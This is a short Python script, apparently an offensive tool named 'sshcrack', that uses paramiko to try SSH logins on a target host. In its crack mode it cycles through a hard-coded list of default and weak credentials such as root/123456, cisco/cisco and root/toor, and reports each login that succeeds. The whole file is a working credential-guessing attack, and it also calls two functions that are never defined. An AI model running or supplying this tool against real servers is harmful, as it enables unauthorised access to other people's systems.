#sshcrack 1.0
#author: k8gege
#https://www.cnblogs.com/k8gege
#https://github.com/k8gege
import paramiko
import sys
import logging

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
logging.raiseExceptions=False
def checkSSH(host,port,user,pwd):
	try:
		ssh.connect(host,port,user,pwd)
		print host+' '+port+' '+user+' '+pwd+' LoginOK'
		checkDns()
		checkPing()
	except:
		pass
host=sys.argv[1]
port=sys.argv[2]
user=sys.argv[3]
pwd=sys.argv[4]
type=sys.argv[5]
if type=='-test':
	checkSSH(host,port,user,pwd)
elif type=='-crack':
	checkSSH(host,port,'root','123456')
	checkSSH(host,port,'root','cisco')
	checkSSH(host,port,'root','Cisco')
	checkSSH(host,port,'admin','123456')
	checkSSH(host,port,'cisco','123456')
	checkSSH(host,port,'cisco','cisco')
	checkSSH(host,port,'Cisco','Cisco')
	checkSSH(host,port,'cisco','cisco123')
	checkSSH(host,port,'admin','admin')
	checkSSH(host,port,'root','Admin')
	checkSSH(host,port,'root','toor')
	checkSSH(host,port,'root','Admin123')
	checkSSH(host,port,'root','system')
	checkSSH(host,port,'root','system123')
	checkSSH(host,port,'root','System')
	checkSSH(host,port,'root','System123')
	checkSSH(host,port,'root','Admin123!@#')
	checkSSH(host,port,'root','root123!@#')
	checkSSH(host,port,'root','root2019')
	checkSSH(host,port,'root','root2018')
	checkSSH(host,port,'root','root2017')
	checkSSH(host,port,'root','root2016')
	checkSSH(host,port,'root','root2015')
	checkSSH(host,port,'root','root2014')
	checkSSH(host,port,'root','root2013')
	checkSSH(host,port,'root','root2012')
else:
	checkSSH(host,port,user,pwd)